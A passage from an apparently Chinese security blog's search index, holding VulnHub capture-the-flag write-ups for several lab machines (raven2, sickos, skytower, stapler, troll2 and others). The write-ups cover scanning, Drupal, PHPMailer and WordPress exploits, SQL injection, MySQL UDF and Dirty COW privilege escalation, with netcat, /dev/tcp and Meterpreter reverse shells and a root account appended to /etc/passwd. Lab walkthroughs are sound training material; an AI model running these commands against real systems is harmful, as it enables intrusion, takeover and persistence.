os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\nruby脚本https://github.com/dreadlocked/Drupalgeddon2\n​\t环境配置：使用报错，提示不能加载highline，gem安装highline。\n\nsudo gem install highline\n\n\n./drupalgeddon2.rb http://192.168.1.102:1898/\n\n\n​\t\nmsfmsfconsoleuse exploit/unix/webapp/drupal_drupalgeddon2 set rhosts 192.168.1.102set rport 1898exploit \n\n\n\n权限提升​\t无论是通过信息收集，生成字典，还是直接通过识别cms找到对于版本的漏洞，都可以拿到靶场的低权限。然后利用lipneas.sh查看可以使用哪些提权。\nlinpeas.sh​\t使用linpeas.sh收集可以利用的cve。\n[+] [CVE-2016-5195] dirtycow   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: highly probable   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]   Download URL: https://www.exploit-db.com/download/40611   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh[+] [CVE-2016-5195] dirtycow 2   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails   Exposure: highly probable   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;   Download URL: https://www.exploit-db.com/download/40839   ext-url: https://www.exploit-db.com/download/40847   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh\n\n\n\ndirtycow2g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow exp.cpp -lutil\n\n\ncat flagssh root@192.168.1.102 # 密码为 dirtyCowFun\n\n\nroot@lampiao:~# cat flag.txt 9740616875908d91ddcdaa8aea3af366\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-lordOfTheRoot(x)","url":"/2022/08/06/vulnhub-lordOfTheRoot/","content":"","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-raven2","url":"/2022/08/03/vulnhub-raven2/","content":"概述信息收集主机发现┌──(kali㉿kali)-[~]└─$ nmap -sP 192.168.56.1/24Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.56.2Host is up (0.0011s latency).Nmap scan report for 192.168.56.100Host is up (0.0056s latency).Nmap scan report for 192.168.56.108Host is up (0.0044s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 2.97 seconds\n\n端口扫描┌──(kali㉿kali)-[~/vh/raven2]└─$ nmap -p- 192.168.56.108Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.56.108Host is up (0.00086s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT      STATE SERVICE22/tcp    open  ssh80/tcp    open  http111/tcp   open  rpcbind47245/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 6.43 seconds\n\n\n\n目录扫描dirsearch -u http://192.168.56.108/ -x 403Target: http://192.168.56.108/[00:11:22] Starting: [00:11:22] 301 -  313B  - /js  -&gt;  http://192.168.56.108/js/               [00:11:23] 200 -   18KB - /.DS_Store                                       [00:11:32] 200 -   13KB - /about.html                                       [00:11:45] 200 -    9KB - /contact.php                                      [00:11:46] 301 -  314B  - /css  -&gt;  http://192.168.56.108/css/              [00:11:50] 301 -  316B  - /fonts  -&gt;  http://192.168.56.108/fonts/          [00:11:52] 301 -  314B  - /img  -&gt;  http://192.168.56.108/img/              [00:11:52] 200 -   16KB - /index.html                                       [00:11:54] 200 -    4KB - /js/                                              [00:11:56] 301 -  317B  - /manual  -&gt;  http://192.168.56.108/manual/        [00:11:56] 200 -  626B  - /manual/index.html                                [00:12:14] 200 -    5KB - /vendor/                                          [00:12:15] 200 -    2KB - /wordpress/wp-login.php                           [00:12:15] 200 -   51KB - /wordpress/                                                                                                       \n\nflag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;\n\n\n漏洞利用wpscanwpscan --api-token nfiU61tvOX0IH0hwkPRsxrtiFTVo0ZGMxTia5sDeXbU --url http://192.168.56.108/wordpress[!] 33 vulnerabilities identified:\n\n​\t试了部分没成功，网上文章说wpscan是根据版本来判断是否存在漏洞，低于漏洞版本则会显示存在漏洞，误报比较多。\nPHPMailer\n​\t通过changelog可以看到该版本为5.2.17，后搜索版本漏洞。\n\n​\thttps://www.exploit-db.com/exploits/40974\nUsage:1 - Download docker vulnerable enviroment at: https://github.com/opsxcq/exploit-CVE-2016-100332 - Config your IP for reverse shell on payload variable4 - Open nc listener in one terminal: $ nc -lnvp &lt;your ip&gt;3 - Open other terminal and run the exploit: python3 anarcoder.py\n\n必要修改参数targetpayload中反弹shell的IP地址生成文件的绝对路径。\n\n\n​\t执行结束后显示\n[+]  ExPLoITeD http://192.168.1.108/contact.php                                                    \n\n\n执行后续流程监听本地端口nc -lvnp 4444\n\n\ntarget​\t访问http://192.168.1.108/contact.php，生成backdoor参数的脚本。\n\nbackdoor​\t访问http://192.168.1.108/back.php，反弹shell。\n\n获取会话\nflag2python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@Raven:/var/www/html$ find / -name flag*find / -name flag*/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png/var/www/flag2.txt/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags/sys/devices/virtual/net/lo/flags/sys/devices/platform/serial8250/tty/ttyS0/flags/sys/devices/platform/serial8250/tty/ttyS1/flags/sys/devices/platform/serial8250/tty/ttyS2/flags/sys/devices/platform/serial8250/tty/ttyS3/flagsfind: `/sys/kernel/debug&#x27;: Permission deniedwww-data@Raven:/var/www/html$ cat /var/www/flag2.txtcat /var/www/flag2.txtflag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;\n\nflag3​\t通过查找，flag3的路径为：/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png，在web路径下，所以直接通过浏览器访问。\nhttp://192.168.1.108/wordpress/wp-content/uploads/2018/11/flag3.png\n\n\n权限提升Linpeas.sh信息收集​\tpython本地开启http服务。\n┌──(kali㉿Kali)-[~/hk/raven2]└─$ python3 -m http.server 1111Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...\n\n​\t目标机器下载脚本。\nwget http://192.168.1.107:1111/linpeas.shchmod +x ./linpeas.sh./linpeas.sh\n\n\nUDF提权条件判断​\t在尝试内核提权无果后，尝试选择使用mysql的UDF提权，接下来开始找mysql中账号root的密码。\n\n找mysql账号密码​\t在web目录下收集mysql的账号密码。\nfind ./ -name *config*\n\n\ngrep -rn &quot;password&quot; ./wordpress/wp-config.php\n\n​\t\n​\t\t\n​\t\t\n\ncat ./wordpress/wp-config.php\n\n\n查看secure_file_priv值​\t拿到mysql的root密码后，进入数据库查看是否满足写入的条件。\nmysql -uroot -pR@v3nSecurity use mysql;show global variables where variable_name=&#x27;secure_file_priv&#x27;;\n\n\n1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权2）当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/目录下，此时也无法提权3）当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\\plugin 文件夹下文件夹下才能创建自定义函数。\n\n​\t这里的secure_file_priv的值为空，所以能够提权。\n是否进程是否以root运行​\t首先先确认是否满足，是否以root用户启动，root账号密码\nps aux | grep mysql\n\n\nUDF提权查看mysql插件目录show global variables where variable_name=&#x27;plugin_dir&#x27;;\n\n\n编译exphttps://www.exploit-db.com/exploits/1518 \n\n\ngcc -g -c 1518.cgcc -g -shared -o udfexp.so 1518.o -lc\n\n创建高权限执行命令的函数wget http://192.168.2.129:1111/udfexp.so -o /tmp/udfexp.somysql -uroot -pR@v3nSecurity use mysql;create table udfexp(line blob);insert into udfexp values(load_file(&#x27;/tmp/udfexp.so&#x27;));select * from udfexp into dumpfile &#x27;/usr/lib/mysql/plugin/udfexp.so&#x27;;create function do_system returns integer soname &#x27;udfexp.so&#x27;;\n\n\n​\t\ndo_system利用方式​\t此时udf提权创建函数已经成功，通过该函数可执行系统命令。\n给find命令所有者的suid权限select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);\n\n\nfind / -exec &quot;/bin/sh&quot; \\;\n\n\n反弹shellselect do_system(&#x27;nc -nv 192.168.2.129 7788 -e /bin/bash&#x27;);\n\n\nnc -lvnp 7799\n\n\n添加用户openssl passwd hello # VVtMBSH8hF8is\n\n\nselect do_system(&#x27;echo &quot;hello:VVtMBSH8hF8is:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd&#x27;);\n\n\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-sickos1.2","url":"/2022/08/13/vulnhub-sickos1-2/","content":"概要信息收集主机发现sudo nmap -sP 192.168.2.0/24          Nmap scan report for 192.168.2.181Host is up (0.11s latency).\n\n\n\n端口扫描nmap -p-  192.168.2.181                   Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.181Host is up (0.013s latency).Not shown: 65533 filtered tcp ports (no-response)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http\n\n\n\n服务探针nmap -p22,80 -sV -A -T4  192.168.2.181 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 14:17 CSTNmap scan report for 192.168.2.181Host is up (0.012s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)80/tcp open  http    lighttpd 1.4.28|_http-title: Site doesn&#x27;t have a title (text/html).|_http-server-header: lighttpd/1.4.28Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds\n\n80\n\n\n目录遍历dirsearch -u http://192.168.2.181/ -x 403\n\n\n\n漏洞利用​\t没有其他开放的端口，web下只有一个test路径，下来也没有什么东西，只显示了用的是lighttpdWeb服务器软件。抓包通过OPTIONS方法查看开放的请求方法。\n\n​\t这里面包含put，使用put上传一个phpinfo看看能不能解析。\n\n\n\n​\t可以解析，然后上传webshell后，蚁剑连接获得低权限。\n\n权限提升","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-sickos1.1","url":"/2022/08/12/vulnhub-sickos1-1/","content":"概要主机发现sudo nmap -sP 192.168.2.0/24          Nmap scan report for 192.168.2.186Host is up (0.11s latency).\n\n\n\n端口扫描nmap -p- -Pn 192.168.2.186Starting Nmap 7.92 ( https://nmap.org ) Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 31.73% done; ETC: 15:56 (0:01:37 remaining)Nmap scan report for 192.168.2.186Host is up (0.011s latency).Not shown: 65532 filtered tcp ports (no-response)PORT     STATE  SERVICE22/tcp   open   ssh3128/tcp open   squid-http8080/tcp closed http-proxyNmap done: 1 IP address (1 host up) scanned in 122.47 seconds\n\n\n\n服务探针nmap -p22,3128,8080 -sV -A -T4 -Pn 192.168.2.186Starting Nmap 7.92 ( https://nmap.org )Nmap scan report for 192.168.2.186Host is up (0.0065s latency).PORT     STATE  SERVICE    VERSION22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)3128/tcp open   http-proxy Squid http proxy 3.1.19|_http-title: ERROR: The requested URL could not be retrieved|_http-server-header: squid/3.1.198080/tcp closed http-proxyService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.44 seconds\n\n\n\n\n\n信息收集​\t这里要通过他的代理3128才能访问到80端口。\n\nrobots.txt\n漏洞利用​\t网页搜索wolf cms exploit\n\n​\t访问漏洞URL\n\nhttp://192.168.2.186/wolfcms/?/admin/plugin/file_manager/browse/\n\n​\t弹出登录框，输入admin/admin进入。\n\n\n​\t上传成功。\n\n\n​\t连接成功，但是这里要注意，需要在蚁剑里配置代理。\n\n​\t\n​\t获得低权限。\n\n权限提升msf​\t\t给msf一个会话，使用 local_exploit_suggester   查看是否有可利用的漏洞。\nmsfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.2.192 lport=3311 -f elf &gt; a.elf\n\n\n\nuse post/multi/recon/local_exploit_suggester   \n\n\nLinpeas.sh\n\n​\tsickos用户加入了sudo组，收集到的mysql root账号的密码正好可以登录sickos用户。\n\n\nflag\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-skytower","url":"/2022/08/11/vulnhub-skytower/","content":"概要信息收集主机发现nmap -sP 192.168.2.0/24Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.176Host is up (0.16s latency).\n\n端口扫描nmap -p-  192.168.2.176    Starting Nmap 7.92 ( https://nmap.org )Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 97.59% done; ETC: 14:01 (0:00:00 remaining)Nmap scan report for 192.168.2.176Host is up (0.044s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT     STATE    SERVICE22/tcp   filtered ssh80/tcp   open     http3128/tcp open     squid-http\n\n服务探针 nmap -p22,80,3128 -T5 -sV -A 192.168.2.176Starting Nmap 7.92 ( https://nmap.org )Nmap scan report for 192.168.2.176Host is up (0.0099s latency).PORT     STATE    SERVICE    VERSION22/tcp   filtered ssh80/tcp   open     http       Apache httpd 2.2.22 ((Debian))|_http-title: Site doesn&#x27;t have a title (text/html).|_http-server-header: Apache/2.2.22 (Debian)3128/tcp open     http-proxy Squid http proxy 3.1.20|_http-title: ERROR: The requested URL could not be retrieved|_http-server-header: squid/3.1.20Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds\n\n\n\n80​\t80端口进来是一个登录页面，尝试查看是否存在注入。\n\n\n​\t可以发现有报错信息，可能存在sql注入。\n漏洞利用sql注入​\t单引号报错，然后使用and ,or试试。\n\n​\t发现没起作用，多加个引号看看报错回显的信息。\n\n​\t从回显大概可以看到这里and 以及 =都被过滤了，在关键字中间加上字母严重猜想。\n\n​\t试试关键字复写。\n\n​\t也不行，使用运算符试试。\n\n​\t尝试成功，返回的结果通过。\n\n翻译：\n欢迎 john@skytech.com如您所知，SkyTech 已停止所有国际业务。对于我们所有的长期员工，我们希望对您的奉献和辛勤工作表示感谢。不幸的是，包括您在内的所有国际合同都已终止。您的剩余合同和退休基金 2 美元已全额支付到安全账户。 出于安全原因，您必须通过 SSH 登录 SkyTech 服务器才能访问帐户详细信息。用户名: john密码: hereisjohn我们祝您在未来的工作中好运。\n\n​\t得到ssh登录账号密码，结果发现连接超时，结合前面端口探针拿到的代理端口，使用代理端口再尝试登录。这里使用proxychains。\nhttp    192.168.2.176 3128\n\nproxychains ssh john@192.168.2.176\n\n\n\nFunds have been withdrawn资金已被提取\n\n​\t这里刚登录上就被关闭了，然后提示资金已被提取后就被断开，所以这里需要直接登录时通过nc反弹shell。\nproxychains ssh john@192.168.2.176 nc 192.168.2.177 2233 -e /bin/bashnc -lvnp 2233\n\n\n\n​\t\n​\t或者利用另外一种方式，删除.bashrc。\nproxychains ssh john@192.168.2.176 mv .bashrc .bashrc.bak  \n\n\n\n\n权限提升mysql信息收集​\t因为用msf提取没有成功，这里想进数据库收集点信息。\n\n\nsara ssh登录saraihatethisjob \n\n​\t尝试了之后发现sara的密码和ssh登录密码也是一致的，然后通过sudo -l看到该用户可以以root权限使用cat和ls命令查看&#x2F;accounts下的所有文件。\n\n..&#x2F;绕过​\t通过../来跳过只查看accounts文件夹限制，然后拿到了root用户的密码。\nsara@SkyTower:~$ sudo ls /accounts/../root/flag.txtsara@SkyTower:~$ sudo cat /accounts/../root/flag.txtCongratz, have a cold one to celebrate!root password is theskytower\n\n\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-stapler","url":"/2022/08/10/vulnhub-stapler/","content":"概述信息收集主机发现nmap -sP 192.168.2.0/24Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.173Host is up (0.073s latency).\n\n\n\n端口扫描nmap -p- 192.168.2.173Starting Nmap 7.92 ( https://nmap.org )Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 97.76% done; ETC: 13:48 (0:00:02 remaining)Nmap scan report for 192.168.2.173Host is up (0.011s latency).Not shown: 65523 filtered tcp ports (no-response)PORT      STATE  SERVICE20/tcp    closed ftp-data21/tcp    open   ftp22/tcp    open   ssh53/tcp    open   domain80/tcp    open   http123/tcp   closed ntp137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn666/tcp   open   doom3306/tcp  open   mysql12380/tcp open   unknownNmap done: 1 IP address (1 host up) scanned in 106.75 seconds\n\n\n\n服务探针sudo nmap -p- -T5 -sV -A -v 192.168.2.173PORT      STATE  SERVICE     VERSION20/tcp    closed ftp-data21/tcp    open   ftp         vsftpd 2.0.8 or later| ftp-syst: |   STAT: | FTP server status:|      Connected to 192.168.2.174|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 1|      vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#x27;t get directory listing: PASV failed: 550 Permission denied.22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)53/tcp    open   domain      dnsmasq 2.75| dns-nsid: |_  bind.version: dnsmasq-2.7580/tcp    open   http        PHP cli server 5.5 or later| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-title: 404 Not Found123/tcp   closed ntp137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)666/tcp   open   doom?| fingerprint-strings: |   NULL: |     message2.jpgUT |     QWux|     &quot;DL[E|     #;3[|     \\xf6|     u([r|     qYQq|     Y_?n2|     3&amp;M~&#123;|     9-a)T|     L&#125;AJ|_    .npy.93306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1| mysql-info: |   Protocol: 10|   Version: 5.7.12-0ubuntu1|   Thread ID: 18|   Capabilities flags: 63487|   Some Capabilities: SupportsCompression, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, Support41Auth, SupportsTransactions, IgnoreSigpipes, ODBCClient, InteractiveClient, LongPassword, SupportsLoadDataLocal, ConnectWithDatabase, FoundRows, LongColumnFlag, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults|   Status: Autocommit|   Salt: R\\x11x;t4\\x10S(*\\x14lH|op@?&amp;\\x1A|_  Auth Plugin Name: mysql_native_password12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))|_http-title: Tim, we need to-do better next year for Initech|_http-server-header: Apache/2.4.18 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\n\n\n\nftpHarry, make sure to update the banner when you get a chance to show who has access hereElly, make sure you update the payload information. Leave it in your FTP account once your are done, John.翻译：哈利，当你有机会在这里展示谁可以访问时，一定要更新横幅Elly，请确保您更新了有效负载信息。 完成后，将其留在您的 FTP 帐户中，约翰。\n\n\n\n666​\t通过nmap扫描，666端口下面有个图片文件。\nnc 192.168.2.173 666\n\n\n​\t将图片保存下来，通过file查看文件类型。\nnc 192.168.2.173 666 &gt; file666file file666                     file666: Zip archive data, at least v2.0 to extract, compression method=deflate\n\n\n​\t文件为zip类型，解压得到一个图片，查看图片是否有信息。\nunzip \n\n\n利用cookie试试wp能不能登录\nCDEFGHIJSTUVWXYZcdefghijstuvwxyz\n\n\n80\ndirsearch -u http://192.168.2.173 -x 403   \n\n\n12380dirsearch -u https://192.168.2.173:12380/ -x 403\n\n\n&#x2F;phpmyadmin\n&#x2F;robots\n&#x2F;admin112233\n\n​\t这里的提示信息：\nGive yourself a cookie! Javascript didn&#39;t run =)\n​\t尝试利用之前得到的cookie失败。\n&#x2F;blogblog\n​\t查看网页源码，发现是WordPress\n\n漏洞利用Advanced Video获取mysql信息​\t在路径插件中找到了advanced video\n\nsearchsploit advanced videocp /usr/share/exploitdb/exploits/php/webapps/39646.py .\n\n\n​\t修改文件中的URL，并加上ssl。这里使用python2执行。\nimport sslssl._create_default_https_context = ssl._create_unverified_contexturl = &quot;https://192.168.2.173:12380/blogblog/&quot; # insert url to wordpress\n\n\n\n\n\n\n\n\n\n​\t下载图片，这个图片其实是个php文件。\nwget https://192.168.2.173:12380/blogblog/wp-content/uploads/1755503324.jpeg --no-check-certificatemv 1755503324.jpeg info.phpcode info.php                          \n\n\n\nmysql拿到wp-admin账号密码mysql -uroot -pplbkac -h 192.168.2.173\n\n\n​\t想直接写文件但是没权限。\n\n​\t只能去获取wp的账号密码，然后进后台再getshell。\nselect * from wordpress.wp_users;\n\n\n​\t保存下来用jhon尝试暴力破解。这里先进行过滤，使用awk，以｜作为分割，打印打四列。\nawk -F &#x27;|&#x27; &#x27;&#123;print $4&#125;&#x27; pass.txt\n\n\nawk -F &#x27;|&#x27; &#x27;&#123;print $4&#125;&#x27; pass.txt &gt; jhon.txtjohn jhon.txt \n\n​\t全部破解感觉意义不大，先拿一个去后台登录看看。\n\n文件上传​\t通过查看后台，发现添加插件的地方存在文件上传漏洞。\nhttps://192.168.2.173:12380/blogblog/wp-admin/plugin-install.php?tab=upload\n\n\n\n​\t蚁剑连接的时候报错证书问题，在其他设置里面勾选忽略HTTPS证书\n\n\n\n权限提升msf提权​\t反弹shell，三个可能能够提前的都尝试无效.\nmsfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.2.177 lport=1122 -f elf &gt;a.elf\n\n\n\n\n​\t\nlipeas.sh\n.bash_history\n\n\n​\t在linpeas.sh运行后找到在这些用户目录下都存在.bash_history，通过一下命令查找一下文件内是否留有登录的记录。\ngrep -rn &quot;sshpass&quot; /home 2&gt;/dev/null\n\n\n​\t正好存在peter登录的记录，由上面通过linpeas脚本的结果可以看到，peter是被添加到了groups，说明可以直接sudo su来获得root权限。\n\nssh peter@192.168.2.173peter@192.168.2.173&#x27;s password: JZQuyIN5\n\n\nCVE-2021-4034 PwnKit​\t通过linpeas脚本进行信息收集，发现了可以通过此提权，尝试后成功。\n\nCVE-2017-7494msf6 &gt; search linux/sambamsf6 exploit(linux/samba/is_known_pipename) &gt; use 2[*] Using configured payload cmd/unix/interactmsf6 exploit(linux/samba/is_known_pipename) &gt; set rhosts 192.168.2.173rhosts =&gt; 192.168.2.173msf6 exploit(linux/samba/is_known_pipename) &gt; set rport 139rport =&gt; 139msf6 exploit(linux/samba/is_known_pipename) &gt; exploit \n\n\n\nflag\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-troll2...","url":"/2022/08/09/vulnhub-troll2/","content":"概要信息收集主机发现lnmap -sP 192.168.2.0/24                                                  Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 15:11 CSTNmap scan report for 192.168.2.1Host is up (0.0029s latency).Nmap scan report for 192.168.2.169Host is up (0.10s latency).\n\n端口扫描nmap -p- 192.168.2.169                                                   Starting Nmap 7.92 ( https://nmap.org )Nmap scan report for 192.168.2.169Host is up (0.021s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 10.68 seconds\n\n\n\n服务探针目录遍历dirsearch -u http://192.168.2.169/ -x 403\n\n\nRobots.txt\ndirsearch -u http://192.168.2.169/ -x 403 -w /home/kali/hk/troll2/url.txt \n\n\n[15:35:38] 301 -  313B  - /noob  -&gt;  http://192.168.2.169/noob/             [15:35:38] 301 -  320B  - /keep_trying  -&gt;  http://192.168.2.169/keep_trying/[15:35:38] 301 -  322B  - /ok_this_is_it  -&gt;  http://192.168.2.169/ok_this_is_it/[15:35:38] 301 -  320B  - /dont_bother  -&gt;  http://192.168.2.169/dont_bother/\n\n​\t四个路径下都是这张图片，查看网页源码，发现图片名为cat the troll.jpg\n\n\nwget http://192.168.2.169/noob/cat_the_troll.jpgstrings cat_the_troll.jpg \n\n​\t图片下载下来没看到有用信息，在想是不是其他几个图片中有信息，于是挨个下载下来。最终在第四个路径下的图片中找到了有用的信息。\n\n&#x2F;y0ur_self\n\n​\t字符被base64编码了，下载下来通过解码生成密码本。\ncat answer.txt | base64 -d &gt; dic.txtcat dic.txt \n\n\nftp登录​\t这里并没有地方去使用这个字典，回过头来登录一下ftp，这里提示来到的是Tr0ll FTP，尝试使用Tr0ll/Tr0ll进行登录，成功，如果这里未成功的话只能尝试爆破ftp或者ssh了。\nftp 192.168.2.169Connected to 192.168.2.169.220 Welcome to Tr0ll FTP... Only noobs stay for a while...Name (192.168.2.169:kali): Tr0ll331 Please specify the password.Password: Tr0ll230 Login successful.\n\n\n解压lmao.zip​\t下载后发现解压需要密码，结合前面生成的字典进行爆破。\nfcrackzip -u -D -p /home/kali/hk/troll2/dic.txt lmao.zipPASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL\n\n\n\n\n\n漏洞利用​\t解压出来是RSA私钥，可以直接通过私钥登录。\n\n\n\n​\t反弹shell\nssh -i noob noob@192.168.2.169 &#x27;() &#123; :;&#125;; bash -i &gt;&amp; /dev/tcp/192.168.2.168/2233 0&gt;&amp;1&#x27;\n\n\nkali监听反弹的shell\nnc -lvnp 2233\n\n\n权限提升Lines.shwget http://192.168.2.168:1111/linpeas.shchmod +x ./linpeas.sh./linpeas.sh\n\n​\t尝试了很多都没成功。\nmsf提权msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.2.172 lport=1122 -f elf &gt;a.elf\n\nmsfconsolemsf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcppayload =&gt; linux/x86/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (linux/x86/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.2.172    yes       The listen address (an interface                                      may be specified)   LPORT  1122             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 192.168.2.172:1122 [*] Sending stage (989032 bytes) to 192.168.2.169[*] Meterpreter session 1 opened (192.168.2.172:1122 -&gt; 192.168.2.169:58803 )meterpreter &gt; getuidServer username: noob\n\n\n​\t通过msf的local_exploit_suggester对比只发现一个似乎可以提权:\nexploit/linux/local/su_login，尝试后失败。\nmsf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/linux/local/su_login[*] Using configured payload linux/x86/meterpreter/reverse_tcpmsf6 exploit(linux/local/su_login) &gt; show options Module options (exploit/linux/local/su_login):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   PASSWORD                   no        Password to authenticate with                                        .   SESSION                    yes       The session to run this modul                                        e on   USERNAME  root             yes       Username to authenticate with                                        .Payload options (linux/x86/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   yes       The listen address (an interface                                      may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Linux x86msf6 exploit(linux/local/su_login) &gt; set session 1 session =&gt; 1msf6 exploit(linux/local/su_login) &gt; set lhost 192.168.2.172 lhost =&gt; 192.168.2.172msf6 exploit(linux/local/su_login) 